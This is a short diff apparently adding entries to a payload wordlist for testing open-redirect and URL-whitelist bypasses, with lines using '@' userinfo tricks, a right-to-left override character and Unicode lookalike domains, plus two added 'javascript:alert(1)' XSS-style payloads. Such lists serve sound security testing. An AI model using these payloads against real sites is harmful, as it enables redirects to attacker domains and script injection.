@@ -543,3 +543,5 @@ https://www.whitelisteddomain.tld@/%E2%80%AE@localdomain.pw
 https://www.whitelisteddomain.tld@/%E2%80%AE@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 https://www.whitelisteddomain.tld@'#localdomain.pw
 https://www.whitelisteddomain.tld@'#Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+javascript:alert(1)//localdomain.pw/
+javascript:alert(1)//www.whitelisteddomain.tld/
